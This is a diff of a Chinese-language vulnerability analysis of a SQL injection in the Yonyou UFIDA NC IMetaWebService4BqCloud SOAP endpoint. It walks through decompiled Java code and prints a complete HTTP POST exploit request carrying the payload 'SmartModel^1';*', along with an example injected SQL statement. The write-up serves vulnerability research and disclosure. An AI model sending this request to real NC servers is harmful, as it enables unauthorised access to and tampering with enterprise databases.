@@ -31,10 +31,10 @@ app="用友-UFIDA-NC"
   
 抓包可以看到，漏洞的利用数据包如下  
 ```
-POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
 Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
@@ -42,16 +42,16 @@ Cookie: JSESSIONID=09133CFE3A7B0CE8341AB1A7DEDFCCDE.server
 Connection: keep-alive
 SOAPAction: urn:loadFields
 Content-Type: text/xml;charset=UTF-8
-Host: 
-Content-Length: 350
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
-   <soapenv:Header/>
-   <soapenv:Body>
-      <imet:loadFields>
-         <!--type: string-->
-         <imet:string>SmartModel^1';*</imet:string>
-      </imet:loadFields>
-   </soapenv:Body>
+Host: 
+Content-Length: 350
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <imet:loadFields>
+         <!--type: string-->
+         <imet:string>SmartModel^1';*</imet:string>
+      </imet:loadFields>
+   </soapenv:Body>
 </soapenv:Envelope>
 ```  
   
@@ -74,35 +74,35 @@ Content-Length: 350
   
 代码如下  
 ```
-public MetaField[] loadFields(String metaEntityId) throws Exception {  
-String metaType = MetaUtilities.getMetaTypeFromMetaId(metaEntityId);  
-if (StringUtils.isEmpty(metaType))  
-returnnull;   
-if (!"SmartModel".equalsIgnoreCase(metaType) && !"SmartMeta".equalsIgnoreCase(metaType) && !"NCDB".equalsIgnoreCase(metaType))  
-returnnull;   
-    IMetaQueryService mqs = (IMetaQueryService)NCLocator.getInstance().lookup(IMetaQueryService.class);  
-    IMetaElement e = mqs.getMetaElementByID(metaEntityId);  
-if (!(e instanceof IMetaEntity))  
-returnnull;   
-    IMetaEntity entity = (IMetaEntity)e;  
-    IMetaAttribute[] attributes = entity.getMetaAttributes();  
-if (attributes == null || attributes.length == 0)  
-returnnull;   
-List<MetaField> fieldList = new ArrayList<>();  
-for (IMetaAttribute a : attributes) {  
-if (a != null)  
-if (isFieldType(a.getMetaType()))  
-          fieldList.add(transToMetaField(a));    
-    }   
-return fieldList.<MetaField>toArray(new MetaField[fieldList.size()]);  
-  }
+public MetaField[] loadFields(String metaEntityId) throws Exception {  
+String metaType = MetaUtilities.getMetaTypeFromMetaId(metaEntityId);  
+if (StringUtils.isEmpty(metaType))  
+returnnull;   
+if (!"SmartModel".equalsIgnoreCase(metaType) && !"SmartMeta".equalsIgnoreCase(metaType) && !"NCDB".equalsIgnoreCase(metaType))  
+returnnull;   
+    IMetaQueryService mqs = (IMetaQueryService)NCLocator.getInstance().lookup(IMetaQueryService.class);  
+    IMetaElement e = mqs.getMetaElementByID(metaEntityId);  
+if (!(e instanceof IMetaEntity))  
+returnnull;   
+    IMetaEntity entity = (IMetaEntity)e;  
+    IMetaAttribute[] attributes = entity.getMetaAttributes();  
+if (attributes == null || attributes.length == 0)  
+returnnull;   
+List<MetaField> fieldList = new ArrayList<>();  
+for (IMetaAttribute a : attributes) {  
+if (a != null)  
+if (isFieldType(a.getMetaType()))  
+          fieldList.add(transToMetaField(a));    
+    }   
+return fieldList.<MetaField>toArray(new MetaField[fieldList.size()]);  
+  }
 
 ```  
   
 可以看到首先方法下面调用了getMetaTypeFromMetaId  
 方法  
 ```
-String metaType = MetaUtilities.getMetaTypeFromMetaId(metaEntityId);
+String metaType = MetaUtilities.getMetaTypeFromMetaId(metaEntityId);
 
 ```  
   
@@ -134,22 +134,22 @@ String metaType = MetaUtilities.getMetaTypeFromMetaId(metaEntityId);
 下面的最后一个方法getMetaByBussinessID  
 ，将上面截断的^前后的字符传入此方法中  
 ```
-public IMetaElement getMetaByBussinessID(String metaType, String businessId) throws MetaException {  
-if (StringUtils.isEmpty(metaType))  
-returnnull;   
-    IMetaDriver[] drivers = MetaDriverManager.getInstance().getDriversByMetaType(metaType);  
-if (drivers == null || drivers.length == 0)  
-returnnull;   
-    IMetaElement result = null;  
-for (IMetaDriver driver : drivers) {  
-      IMetaElement me = driver.getMetaElementByBusinessId(metaType, businessId);  
-if (me != null) {  
-        result = me;  
-break;  
-      }   
-    }   
-return result;  
-  }
+public IMetaElement getMetaByBussinessID(String metaType, String businessId) throws MetaException {  
+if (StringUtils.isEmpty(metaType))  
+returnnull;   
+    IMetaDriver[] drivers = MetaDriverManager.getInstance().getDriversByMetaType(metaType);  
+if (drivers == null || drivers.length == 0)  
+returnnull;   
+    IMetaElement result = null;  
+for (IMetaDriver driver : drivers) {  
+      IMetaElement me = driver.getMetaElementByBusinessId(metaType, businessId);  
+if (me != null) {  
+        result = me;  
+break;  
+      }   
+    }   
+return result;  
+  }
 
 ```  
   
@@ -184,15 +184,15 @@ getInstance
   
 到此分析结束，所以传入这个方法的字符串可以是以SmartModel^开头，后面再拼接SQL语句，类似会得到这样的解析  
 ```
-dsName = "SmartModel"
-tableName = "'; 恶意SQL语句--"
+dsName = "SmartModel"
+tableName = "'; 恶意SQL语句--"
 
 ```  
   
-调用 getColumns(...)  
- 时，JDBC 驱动可能构造出类似 SQL  
+调用 getColumns(...)  
+ 时，JDBC 驱动可能构造出类似 SQL  
 ```
-SELECT * FROM ALL_CONS_COLUMNS WHERE TABLE_NAME = ''; 恶意SQL语句--'
+SELECT * FROM ALL_CONS_COLUMNS WHERE TABLE_NAME = ''; 恶意SQL语句--'
 ```  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSn3Viac9hzfSk85o3uJ7uzCY3JUjyF2ShwVicyXdcGbSfH0PDyLuhaJzic10Bvg4KQoAiaGEXWESQcvg/640?wx_fmt=png&from=appmsg "")  
